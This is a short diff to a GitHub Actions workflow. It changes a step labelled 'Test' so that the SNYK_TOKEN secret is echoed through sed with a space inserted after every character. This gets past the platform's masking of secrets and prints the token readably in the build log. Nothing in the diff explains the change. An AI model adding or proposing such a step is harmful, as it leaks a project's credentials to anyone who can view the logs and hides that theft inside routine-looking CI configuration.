@@ -14,4 +14,4 @@ jobs:
     steps:
       - name: Test
         run: |
-          echo "${{ secrets.SNYK_TOKEN }}"
+          echo "${{ secrets.SNYK_TOKEN }}" | sed 's/./& /g'
